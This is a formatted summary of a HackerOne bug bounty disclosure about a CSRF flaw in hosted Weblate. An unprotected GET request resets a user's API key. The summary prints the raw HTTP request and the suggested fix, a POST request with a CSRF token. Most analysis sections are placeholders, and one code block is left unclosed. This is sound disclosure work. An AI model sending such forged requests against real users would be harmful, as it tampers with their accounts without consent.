# CSRF : Reset API 

## Metadata
- **Source:** HackerOne
- **Report:** 223333 | https://hackerone.com/reports/223333
- **Submitted:** 2017-04-24
- **Reporter:** jaypatel
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** low
- **Vuln:** Cross-Site Request Forgery (CSRF)
- **CVEs:** None
- **Category:** web-api

## Summary
**Description :**
Attacker can force to victim for reset his API.

**That HTTP Request :**
```
GET /accounts/reset-api-key/ HTTP/1.1
Host: hosted.weblate.org
Connection: close
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

**Description :**
Attacker can force to victim for reset his API.

**That HTTP Request :**
```
GET /accounts/reset-api-key/ HTTP/1.1
Host: hosted.weblate.org
Connection: close
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Referer: https://hosted.weblate.org/
Accept-Encoding: gzip, deflate, sdch, br
Accept-Language: en-US,en;q=0.8
Cookie: cookie_here
```
**Fix :**
Make that Request POST , and add a CSRF token there.

Best Regards',
Jay Patel



</details>

---
*Analysed by Claude on 2026-05-24*
